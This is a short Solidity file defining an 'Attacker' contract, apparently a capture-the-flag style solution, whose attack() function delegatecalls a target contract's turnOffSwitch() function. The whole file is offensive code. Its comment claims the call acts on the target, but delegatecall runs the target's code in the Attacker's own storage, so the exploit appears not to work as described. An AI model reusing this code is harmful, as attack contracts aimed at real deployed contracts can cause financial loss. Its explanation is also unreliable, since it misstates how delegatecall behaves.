// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISwitch {
    function turnOffSwitch() external;
}

contract Attacker {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    // This function will delegatecall to the target's turnOffSwitch() function
    function attack() external {
        (bool success, ) = target.delegatecall(
            abi.encodeWithSignature("turnOffSwitch()")
        );
        require(success, "Delegatecall failed");
    }
}
